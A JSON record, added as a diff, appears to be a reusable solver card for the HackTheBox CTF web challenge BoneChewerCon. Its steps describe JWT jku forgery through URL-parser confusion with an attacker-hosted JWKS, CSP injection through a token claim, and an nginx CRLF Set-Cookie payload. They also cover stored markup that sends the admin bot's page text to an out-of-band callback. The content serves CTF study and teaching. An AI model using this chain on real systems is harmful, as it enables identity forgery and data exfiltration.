@@ -1,0 +1,118 @@
+{
+  "schema_version": 1,
+  "id": "htb-bonechewercon-jku-forge-csp-injection-nginx-crlf-cookie-plant",
+  "source_note": "solved/htb-bonechewercon-jku-csp-crlf.md",
+  "challenge": {
+    "name": "BoneChewerCon",
+    "platform": "HackTheBox",
+    "event": "HTB x University Qualifier CTF 2020",
+    "category": "web",
+    "solved_at": "2026-09-24",
+    "assistance": "writeup-assisted"
+  },
+  "stack": [
+    "python",
+    "flask",
+    "uwsgi",
+    "nginx",
+    "sqlite",
+    "jwt",
+    "rs256",
+    "selenium",
+    "chrome"
+  ],
+  "preconditions": {
+    "all_of": [
+      "a JWT header names the key source (jku/x5u) and the server fetches it to verify",
+      "a privileged page is rendered for a bot on loopback that the attacker cannot reach directly"
+    ],
+    "any_of": [
+      "a session-controlled value is concatenated into a response header",
+      "a proxy reflects the decoded request path into a redirect Location",
+      "stored user content is written into the DOM with innerHTML"
+    ]
+  },
+  "signals": [
+    "jku",
+    "jwks.json",
+    "rs256",
+    "get_unverified_header",
+    "auth_provider",
+    "report-uri",
+    "base-uri",
+    "innerHTML",
+    "$uri",
+    "error_path"
+  ],
+  "chain": [
+    {
+      "step": 1,
+      "stage": "recon",
+      "action": "decode the session cookie and read the JWT header, not just the payload",
+      "why": "a jku/x5u header means the verifier trusts a URL taken from the untrusted token itself"
+    },
+    {
+      "step": 2,
+      "stage": "primitive",
+      "action": "compare the validator's host extraction with the HTTP client's: here domain=netloc.split('@')[1] vs requests' urlsplit().hostname=rpartition('@')[2]; abuse the disagreement with https://abc@localhost@ATTACKER/jwks.json",
+      "why": "two URL parsers in one path is the bug; note the sibling scheme/port checks are dead code because a Python 3 filter() object is always truthy"
+    },
+    {
+      "step": 3,
+      "stage": "primitive",
+      "action": "serve a JWKS whose n and e are DECIMAL strings with Content-Type application/json at a path ending jwks.json, sign a token with the matching private key and username=admin",
+      "why": "the app calls jwk[field].isdigit() before converting, so base64url n/e are rejected; confirm with a read-only GET / and watch the role error change"
+    },
+    {
+      "step": 4,
+      "stage": "pivot",
+      "action": "put CSP directives in the controlled claim - give the JWT's token claim the value [16 hex chars] followed by:  ; script-src 'self' 'unsafe-inline'; connect-src *; img-src *",
+      "why": "the header is built by raw f-string concatenation, and within one policy an explicit script-src overrides the default-src fallback"
+    },
+    {
+      "step": 5,
+      "stage": "pivot",
+      "action": "plant that cookie on the bot through nginx CRLF: /list/x%0d%0aSet-Cookie:%20auth=<JWT>;%20Path=/list against a redirect built from $uri",
+      "why": "$uri is percent-decoded (unlike $request_uri), so the Location line accepts injected headers; Path=/list makes RFC 6265 order the planted cookie ahead of the bot's own Path=/ cookie"
+    },
+    {
+      "step": 6,
+      "stage": "delivery",
+      "action": "store one idea containing a <meta http-equiv=refresh> to that CRLF URL followed by an <img src=x onerror=...> exfil",
+      "why": "navigation is not covered by default-src, so meta refresh still fires under a strict CSP; the handler is inert on the first render and executes on the second once the CSP is weakened"
+    },
+    {
+      "step": 7,
+      "stage": "flag",
+      "action": "read the flag from the out-of-band callback carrying document.body.innerText",
+      "why": "the privileged page is only ever rendered in the bot's browser, so the flag has to leave through the bot"
+    }
+  ],
+  "first_confirming_probe": {
+    "request": "set the auth cookie to a JWT whose jku is https://abc@localhost@YOURHOST/jwks.json signed with your own key, then GET / and watch your JWKS host",
+    "expected": "200 on / plus a hit on your jwks.json, and the privileged endpoint's error changing from 'You are not admin' to the next gate - proof the forged identity was accepted",
+    "falsifier": "400 'Invalid provider' (host check not bypassed) or 400 'Invalid exponent and/or modulus' (n/e were not decimal strings)"
+  },
+  "blast_radius": "shared instance: the payload is a row in a shared presentations table with NO delete endpoint, so it cannot be cleaned up afterwards, and while it is live it redirects the shared admin bot and overwrites its auth cookie. Submit exactly one, expect the bot/app to reset the table periodically (so it may need re-submitting), and never point the meta refresh anywhere but the challenge host.",
+  "verification": {
+    "status": "verified_live",
+    "evidence": "the bot fetched the attacker JWKS (proving the planted cookie was decoded) and then called back with the rendered admin table containing the flag row and the /list error_path flash"
+  },
+  "reuse_when": [
+    "a JWT header carries jku, x5u or any key-source URL",
+    "a host allowlist is enforced by string splitting rather than by the same parser the HTTP client uses",
+    "a response header is assembled by concatenating a session-controlled value",
+    "nginx reflects $uri into a redirect Location",
+    "a strict CSP blocks scripts but a bot must still be steered somewhere"
+  ],
+  "known_traps": [
+    "NAME COLLISION: a different HTB challenge, 'baby BoneChewerCon', is nginx/PHP/Laravel/Whoops and is covered by htb-bonechewercon-method-not-allowed-whoops-env-disclosure. Check the stack before reusing either card; chain_match scores signals, not challenge names, so a name query returns nothing and that is correct.",
+    "the IP gate is genuine here: /api/bot/login answers 'Your IP is not allowed' and X-Forwarded-For does not help, so a forged admin token alone reads nothing - the bot must do the reading",
+    "JWKS n and e must be decimal digit strings because of an isdigit() check; base64url values abort with 'Invalid exponent and/or modulus'",
+    "dangling markup absorbs forward only, and every submission renders below the flag row, so no dangling-markup variant reaches the flag; that dead end is what forces the CSP-injection route",
+    "the first render cannot execute the handler - the CSP is still strict at that point; expect the exfil only on the second load, after the cookie swap",
+    "set Path=/list on the planted cookie, otherwise the bot's existing Path=/ cookie may be sent first and the CSP is never poisoned",
+    "a free tunnel that injects a browser-warning interstitial will fail the Content-Type application/json check; verify the JWKS URL with an Accept: */* request before using it"
+  ],
+  "flag": null
+}
